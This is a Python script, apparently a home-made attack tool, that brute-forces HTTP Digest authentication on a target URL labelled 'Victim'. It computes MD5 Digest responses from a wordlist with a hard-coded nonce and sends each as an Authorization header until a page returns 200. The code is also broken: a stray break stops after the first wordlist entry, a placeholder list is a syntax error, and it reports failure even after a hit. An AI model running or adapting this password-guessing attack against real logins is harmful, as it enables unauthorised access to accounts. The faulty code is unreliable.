import argparse
import hashlib
import requests
from colorama import Fore, Style

# Creating the parser, Adding and parsing argument
parser = argparse.ArgumentParser()
parser.add_argument('-u','--url',required=True,help='URL Victim')
parser.add_argument('-w','--wordlist',help='Wordlist of passwords')
parser.add_argument('-W','--words',help='Word by word')
parser.add_argument('-U','--username',help='Username to use')
parser.add_argument('-r','--realm',help='Realm to use')
args = parser.parse_args()

# Default values of Authorization HTTP header (MAYBE CHANGE! CHECK IT)
username = "admin"
realm = "Web Portal"
nonce = "5e93de3efa544e85dcd6311732d28f95"
nc = "00000001"
cnonce = "5e93de3efa544e85"
qop = "auth"
method = "GET"
uri = "/"

# If statement for custom Username and Realm
if args.username != None and args.realm != None:
    username = args.username
    realm = args.realm
else:
    pass

# Wordlist and Hashes list
Wordlist_Standard = [#SOMETHING HERE]

wordlist=args.wordlist
Wordlist_Custom = []
Hashes = []

print(Fore.CYAN + "\nPreparing Hash Values With Wordlist...\n")

# Iteration to generate each MD5 Hash value from Wordlist
if wordlist != None and args.words == None:
    try:
        with open(wordlist, "r") as file:
            for line in file:
                word = line.strip()
                Wordlist_Custom.append(word)
        for i in Wordlist_Custom:
            a1 = hashlib.md5(f"{username}:{realm}:{i}".encode()).hexdigest()
            a2 = hashlib.md5(f"{method}:{uri}".encode()).hexdigest()
            a3 = f"{a1}:{nonce}:{nc}:{cnonce}:{qop}:{a2}"
            a4 = hashlib.md5(a3.encode()).hexdigest()
            Hashes.append(a4)
            break
    except:
        print(Fore.RED + f"[-] The Wordlist {wordlist} was NOT found!")
        exit()

# SPECIAL STATEMENT FOR ENCRYPTED FILES USED WITHIN XARGS COMMAND or SINGLE WORD
# Example: ccdecrypt -c FILE | tr '\n' ' ' | xargs -I {} echo {} | xargs -I {} python3 FILE -u HOST -W {}
elif args.words != None and wordlist == None:
    try:
        words = args.words.split()
        Words = words
        for i in Words:
            a1 = hashlib.md5(f"{username}:{realm}:{i}".encode()).hexdigest()
            a2 = hashlib.md5(f"{method}:{uri}".encode()).hexdigest()
            a3 = f"{a1}:{nonce}:{nc}:{cnonce}:{qop}:{a2}"
            a4 = hashlib.md5(a3.encode()).hexdigest()
            Hashes.append(a4)    
    except:
        print(Fore.RED + f"[-] The Words are BAD! Try with Wordlist")
        exit()

else:
    for i in Wordlist_Standard:
        a1 = hashlib.md5(f"{username}:{realm}:{i}".encode()).hexdigest()
        a2 = hashlib.md5(f"{method}:{uri}".encode()).hexdigest()
        a3 = f"{a1}:{nonce}:{nc}:{cnonce}:{qop}:{a2}"
        a4 = hashlib.md5(a3.encode()).hexdigest()
        Hashes.append(a4)

# URL target parsed
url = args.url
print(Fore.YELLOW + f"[#] Victim: {url}\n ")

# Custom Hash:Wordlist to analyse after crack it and found simple text password
if wordlist != None:
    Original = [f"{Hash}:{Pass}" for Hash, Pass in zip(Hashes, Wordlist_Custom)]
elif args.words != None:
    Original = [f"{Hash}:{Pass}" for Hash, Pass in zip(Hashes, Words)] 
else:
    Original = [f"{Hash}:{Pass}" for Hash, Pass in zip(Hashes, Wordlist_Standard)]

# Iteration to request each MD5 Hash value with parameters value of Authorization and print founded.
print(Fore.RED + "Starting attack through hash values generated...\n")
for i in Hashes:
    try:
        headers = {'Authorization': 'Digest username="{0}", realm="{1}", nonce="5e93de3efa544e85dcd6311732d28f95", uri="/", response={2}, qop=auth, nc=00000001, cnonce="5e93de3efa544e85"'.format(username,realm,i)}
        response = requests.get(url, headers=headers)
        status_code = response.status_code
        if status_code == 200:
            print(Fore.GREEN + f"[*] FOUND IT!")
            matches = [match for match in Original if i in match]
            print(f"[+] {matches}")
            break

    except requests.exceptions.RequestException as e:
        print(Fore.RED + "[-] Couldn't not connect!")
        exit()

# If none password was found
print(Fore.RED + "[!] None passwords found")
print(Fore.YELLOW + "Try to change Wordlist or\nCheck parameters Value like REALM")
